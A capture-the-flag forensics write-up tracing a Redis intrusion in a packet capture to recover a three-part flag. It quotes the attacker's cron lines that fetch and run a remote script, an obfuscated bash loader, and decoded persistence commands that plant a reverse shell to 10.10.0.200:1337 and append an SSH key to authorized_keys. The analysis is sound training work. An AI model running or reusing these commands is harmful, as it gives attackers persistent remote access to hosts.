# Forensics

## Description

Our SOC team detected a suspicious activity on one of our Redis instance. Despite the fact it was password protected it seems that the attacker still obtained access to it. We need to put in place a remediation strategy as soon as possible, to do that it's necessary to gather more information about the attack used. NOTE: flag is composed by three parts.
## Solution

We are given single `capture.pcap` file and whole conversation seems to be in TCP. Redis also takes main percentage of conversation.

![redtrails.png](/assets/ctf/htb/forensics/redtrails.png)

After following the TCP stream 0 at the end we get information about what attacker did:
```bash
# Server
redis_version:7.2.1
...
# Keyspace
db0:keys=1,expires=0,avg_ttl=0
...
users_table
alice7185:password
6ccd3011eba1f7f0cb6e6143c40580e1
alice7185:email
alice7185@htb.local
bob9862:password
8baea79cb48a8ed8247cce03f6b1ab14
bob9862:email
bob9862@htb.local
charlie4371:password
a2a789021839be8f458b49ffd107558a
charlie4371:email
charlie4371@htb.local
david5014:password
f059fc5d167f597a91c48041dea1460a
david5014:email
david5014@htb.local
emma1716:password
d7df8cffd58ec406c74116a33afd3cc7
emma1716:email
emma1716@htb.local
frank2180:password
4fe3d40556cd5fe47872053f2f2818b1
frank2180:email
frank2180@htb.local
grace8972:password
f2d9e78f6c3717c9bfb3507e95074189
grace8972:email
grace8972@htb.local
henry6159:password
afb04edbeda01e437c644e84c1d539eb
henry6159:email
FLAG_PART:_c0uld_0p3n_n3w
ivy7948:password
70fde9bb12772a894ac7b51fe78f1da2
ivy7948:email
ivy7948@htb.local
jack3908:password
9f791d0427c8a5e299fceffb20205492
jack3908:email
jack3908@htb.local
...
* * * * * wget -O VgLy8V0Zxo 'http://files.pypi-install.com/packages/VgLy8V0Zxo' && bash VgLy8V0Zxo
*/5 * * * * curl -s -k 'http://files.pypi-install.com/packages/VgLy8V0Zxo' > VgLy8V0Zxo && bash VgLy8V0Zxo
*/7 * * * * lynx -source 'http://files.pypi-install.com/packages/VgLy8V0Zxo' > VgLy8V0Zxo && bash VgLy8V0Zxo
/var/spool/cron/crontabs
...
```

First `FLAG_PART:_c0uld_0p3n_n3w` will be useful for us.

Second attacker setup cronjobs to download some package and execute them every minute, 5 minute and 7 minute.

Next stream shows the request going to that endpoint
```http
GET /packages/VgLy8V0Zxo HTTP/1.1
Host: files.pypi-install.com
User-Agent: Wget
Connection: close

HTTP/1.1 200 OK
Date: Mon, 06 Nov 2023 15:11:30 GMT
Server: Apache/2.4.54 (Debian)
Last-Modified: Mon, 06 Nov 2023 15:08:53 GMT
ETag: "959-6097d3b79b941"
Accept-Ranges: bytes
Content-Length: 2393
Connection: close

gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '==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
' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"
```

Replace `eval` with `echo`
```bash
└─$ bash t.sh
#!/bin/bash

lhJVXukWibAFfkv() {
	ABvnz='ZWNobyAnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3R'
	QOPjH='jcC8xMC4xMC4wLjIwMC8xMzM3IDA+JjEiJyA+IC9'
	gQIxX='ldGMvdXBkYXRlLW1vdGQuZC8wMC1oZWFkZXIK'
    echo "$ABvnz$QOPjH$gQIxX" | base64 --decode # | bash
}

x7KG0bvubT6dID2() {
        LQebW="ZWNobyAtZSAiXG5zc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUNBUUM4VmtxOVVUS01ha0F4MlpxK1BuWk5jNm5ZdUVL"
        gVR7i="M1pWWHhIMTViYlVlQitlbENiM0piVkp5QmZ2QXVaMHNvbmZBcVpzeXE5Smc2L0tHdE5zRW10VktYcm9QWGh6RnVtVGdnN1oxTnZyVU52"
        bkzHk="bnFMSWNmeFRuUDErLzRYMjg0aHAwYkYyVmJJVGI2b1FLZ3pSZE9zOEd0T2FzS2FLMGsvLzJFNW8wUktJRWRyeDBhTDVIQk9HUHgwcDhH"
        q97up="ckdlNGtSS29Bb2tHWHdEVlQyMkxsQnlsUmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3SzEzdEhYekVrN09jaVVtZDUvWjdZdW9s"
        GYJan="bnQzQnlYOWErSWZMTUQvRlFOeTFCNERZaHNZNjJPN28yeFIwdnhrQkVwNVVoQkFYOGdPVEcwd2p6clVIeG1kVWltWGdpeTM5WVZaYVRK"
        HJj6A="UXdMQnR6SlMvL1loa2V3eUYvK0NQMEg3d0lLSUVybGY1V0ZLNXNrTFlPNnVLVnB4NmFrR1hZOEdBRG5QVTNpUEsvTXRCQytScVdzc2Rr"
        fD9Kc="R3FGSUE1eEcyRm4rS2xpZDlPYm0xdVhleEpmWVZqSk1PZnZ1cXRiNktjZ0xtaTV1UmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3"
        hpAgs="SzEzdEhYekVrN09jaVVtZDUvWjdZdW9sbnQzQnlYOWErSWxTeGFpT0FEMmlOSmJvTnVVSXhNSC85SE5ZS2Q2bWx3VXBvdnFGY0dCcVhp"
        FqOPN="emNGMjFieE5Hb09FMzFWZm94MmZxMnFXMzBCRFd0SHJyWWk3NmlMaDAyRmVySEVZSGRRQUFBMDhOZlVIeUN3MGZWbC9xdDZiQWdLU2Iw"
        CpJLT="Mms2OTFsY0RBbzVKcEVFek5RcHViMFg4eEpJdHJidz09SFRCe3IzZDE1XzFuNTc0bmMzNSIgPj4gfi8uc3NoL2F1dGhvcml6ZWRfa2V5"
        PIx1p="cw=="
        echo "$LQebW$gVR7i$bkzHk$q97up$GYJan$HJj6A$fD9Kc$hpAgs$FqOPN$CpJLT$PIx1p" | base64 --decode # | bash
}

hL8FbEfp9L1261G() {
        lhJVXukWibAFfkv
        x7KG0bvubT6dID2
}

hL8FbEfp9L1261G
```

I commented piping commands to bash to avoid trouble, after running it:
```bash
└─$ bash t.sh
echo 'bash -c "bash -i >& /dev/tcp/10.10.0.200/1337 0>&1"' > /etc/update-motd.d/00-header
echo -e "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC8Vkq9UTKMakAx2Z

q+PnZNc6nYuEK3ZVXxH15bbUeB+elCb3JbVJyBfvAuZ0sonfAqZsyq9Jg6/KGtNsEmtVKXroPXhzFumTgg7Z1NvrUNvnqLIcfxTnP1+/4X284hp0bF2VbITb6oQKgzRdOs8GtOasKaK0k//2E5o0RKIEdrx0aL5HBOGPx0p8GrGe4kRKoAokGXwDVT22LlBylRkA6+x6jZtd2gYhCMgSZ0iM9RyY7k7K13tHXzEk7OciUmd5/Z7Yuolnt3ByX9a+IfLMD/FQNy1B4DYhsY62O7o2xR0vxkBEp5UhBAX8gOTG0wjzrUHxmdUimXgiy39YVZaTJQwLBtzJS//YhkewyF/+CP0H7wIKIErlf5WFK5skLYO6uKVpx6akGXY8GADnPU3iPK/MtBC+RqWssdkGqFIA5xG2Fn+Klid9Obm1uXexJfYVjJMOfvuqtb6KcgLmi5uRkA6+x6jZtd2gYhCMgSZ0iM9RyY7k7K13tHXzEk7OciUmd5/Z7Yuolnt3ByX9a+IlSxaiOAD2iNJboNuUIxMH/9HNYKd6mlwUpovqFcGBqXizcF21bxNGoOE31Vfox2fq2qW30BDWtHrrYi76iLh02FerHEYHdQAAA08NfUHyCw0fVl/qt6bAgKSb02k691lcDAo5JpEEzNQpub0X8xJItrbw==HTB{r3d15_1n574nc35" >> ~/.ssh/authorized_keys 
```

Flag chunk: `HTB{r3d15_1n574nc35`

Now the flag is: `HTB{r3d15_1n574nc35_c0uld_0p3n_n3w`, looks like still need 3rd part....

The next stream contains `wget` command, but it must have failed because traffic doesn't contain this request.

![redtrails-1.png](/assets/ctf/htb/forensics/redtrails-1.png)

Communication to revshell must have also failed?

![redtrails-2.png](/assets/ctf/htb/forensics/redtrails-2.png)

Going back to the Stream 2, it's using `system.exec` and after quick google: [https://github.com/jas502n/Redis-RCE](https://github.com/jas502n/Redis-RCE)

![redtrails-3.png](/assets/ctf/htb/forensics/redtrails-3.png)

The exported file had first line which shouldn't have belonged to binary so I just removed it via `vim`

```bash 
└─$ ghidra_auto -t redtrails.bin
[*] File Ouput:
        ELF 64-bit LSB shared object
        x86-64
        version 1 (SYSV)
        dynamically linked
        stripped
[*] Running Analysis...
```

This ain't gonna be fun 😢

![redtrails-4.png](/assets/ctf/htb/forensics/redtrails-4.png)

Well, struggle wasn't that hard. It's doing AES encryption and Key/IV is stored in plaintext.

![redtrails-5.png](/assets/ctf/htb/forensics/redtrails-5.png)

```bash
Key: h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz
IV: YDP7ECjzuV7sagMN

Data from Stream 2:
adb4bb64d395eff7d093f5fba5481ab0e71be15728b38130a6d4276b8b5bdb2f
a64e32bc245f94d0b290094eafdb80d17b397747a91029f60788e2432f918f3f8dbb1fdd303a56644497353ebf17e3fb407cc36c04612c1570435507fa7e2e78c98d338f40c0b81187e6f5b549d051f6a9aa891d5642714263c8000af7d2b17c12181db077eb06dad7f843bf4e5aaca3
394810bbd00d01baa64e1da65ad18dcbe7d1ca585d429847e0fe1c4f76ff3cf49fcc4943e9dd339c5cbac2fd876c21d37b4ea3c014fe679f81cd9a546a7a324c6958b87785237671b3331ae9a54d126f78c916de74c154a1915a963edffdb357af5d7cfdb85b200fdeb35f4f508367081e31e3094c15e2a683865bb05b04a36b19202ab49c5ebffcec7698d5f2e344c5d9da608c5c2506c689c1fc4a492bec4dd4db33becb17d631c0fdd7e642c20ffa7e987d2851c532e77bdfb094c0cfcd228499c57ea257f305c367b813bc4d4cf937136e02398ce7cb3c26f16f3c6fc22a2b43795d41260b46d8bdf0432aaefbcc863880571952510bf3d98919219ab49e86974f11a81fff5ff85734601e79c2c2d754e3fe7a6cfcec8349ceb350ea7145f87b86f7e65543268c8ae76cb54bef1885b01b222841da59a377140ae6bd544cc47ac550a865af84f5b31df6a21e7816ed163260f47ea16a64f153be1399911a99fd71b30689b961477db551c9bc2cdc1aa6b931ba2852af1e297ee66fb99381ab916b377358243152f1f3abba9f7ad700ba873b53dc2f98642f47580d7ef5d3e3b32b3c4a9a53689c68a5911a6258f2da92ca30661ebef77109e1e44f3aa6665f6734af7d3d721201e3d31c61d4da562cef34f66dd7f88fb639b2aaf4444952
```

Decode with [CyberChef](https://gchq.github.io/CyberChef/#recipe=Fork0x28'%5C%5Cn','%5C%5Cn',false0x29AES_Decrypt0x28%7B'option':'UTF8','string':'h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz'%7D,%7B'option':'UTF8','string':'YDP7ECjzuV7sagMN'%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D0x29&input=YWRiNGJiNjRkMzk1ZWZmN2QwOTNmNWZiYTU0ODFhYjBlNzFiZTE1NzI4YjM4MTMwYTZkNDI3NmI4YjViZGIyZgphNjRlMzJiYzI0NWY5NGQwYjI5MDA5NGVhZmRiODBkMTdiMzk3NzQ3YTkxMDI5ZjYwNzg4ZTI0MzJmOTE4ZjNmOGRiYjFmZGQzMDNhNTY2NDQ0OTczNTNlYmYxN2UzZmI0MDdjYzM2YzA0NjEyYzE1NzA0MzU1MDdmYTdlMmU3OGM5OGQzMzhmNDBjMGI4MTE4N2U2ZjViNTQ5ZDA1MWY2YTlhYTg5MWQ1NjQyNzE0MjYzYzgwMDBhZjdkMmIxN2MxMjE4MWRiMDc3ZWIwNmRhZDdmODQzYmY0ZTVhYWNhMw0KMzk0ODEwYmJkMDBkMDFiYWE2NGUxZGE2NWFkMThkY2JlN2QxY2E1ODVkNDI5ODQ3ZTBmZTFjNGY3NmZmM2NmNDlmY2M0OTQzZTlkZDMzOWM1Y2JhYzJmZDg3NmMyMWQzN2I0ZWEzYzAxNGZlNjc5ZjgxY2Q5YTU0NmE3YTMyNGM2OTU4Yjg3Nzg1MjM3NjcxYjMzMzFhZTlhNTRkMTI2Zjc4YzkxNmRlNzRjMTU0YTE5MTVhOTYzZWRmZmRiMzU3YWY1ZDdjZmRiODViMjAwZmRlYjM1ZjRmNTA4MzY3MDgxZTMxZTMwOTRjMTVlMmE2ODM4NjViYjA1YjA0YTM2YjE5MjAyYWI0OWM1ZWJmZmNlYzc2OThkNWYyZTM0NGM1ZDlkYTYwOGM1YzI1MDZjNjg5YzFmYzRhNDkyYmVjNGRkNGRiMzNiZWNiMTdkNjMxYzBmZGQ3ZTY0MmMyMGZmYTdlOTg3ZDI4NTFjNTMyZTc3YmRmYjA5NGMwY2ZjZDIyODQ5OWM1N2VhMjU3ZjMwNWMzNjdiODEzYmM0ZDRjZjkzNzEzNmUwMjM5OGNlN2NiM2MyNmYxNmYzYzZmYzIyYTJiNDM3OTVkNDEyNjBiNDZkOGJkZjA0MzJhYWVmYmNjODYzODgwNTcxOTUyNTEwYmYzZDk4OTE5MjE5YWI0OWU4Njk3NGYxMWE4MWZmZjVmZjg1NzM0NjAxZTc5YzJjMmQ3NTRlM2ZlN2E2Y2ZjZWM4MzQ5Y2ViMzUwZWE3MTQ1Zjg3Yjg2ZjdlNjU1NDMyNjhjOGFlNzZjYjU0YmVmMTg4NWIwMWIyMjI4NDFkYTU5YTM3NzE0MGFlNmJkNTQ0Y2M0N2FjNTUwYTg2NWFmODRmNWIzMWRmNmEyMWU3ODE2ZWQxNjMyNjBmNDdlYTE2YTY0ZjE1M2JlMTM5OTkxMWE5OWZkNzFiMzA2ODliOTYxNDc3ZGI1NTFjOWJjMmNkYzFhYTZiOTMxYmEyODUyYWYxZTI5N2VlNjZmYjk5MzgxYWI5MTZiMzc3MzU4MjQzMTUyZjFmM2FiYmE5ZjdhZDcwMGJhODczYjUzZGMyZjk4NjQyZjQ3NTgwZDdlZjVkM2UzYjMyYjNjNGE5YTUzNjg5YzY4YTU5MTFhNjI1OGYyZGE5MmNhMzA2NjFlYmVmNzcxMDllMWU0NGYzYWE2NjY1ZjY3MzRhZjdkM2Q3MjEyMDFlM2QzMWM2MWQ0ZGE1NjJjZWYzNGY2NmRkN2Y4OGZiNjM5YjJhYWY0NDQ0OTUy)

![redtrails-6.png](/assets/ctf/htb/forensics/redtrails-6.png)

> Flag: `HTB{r3d15_1n574nc35_c0uld_0p3n_n3w_un3xp3c73d_7r41l5!}`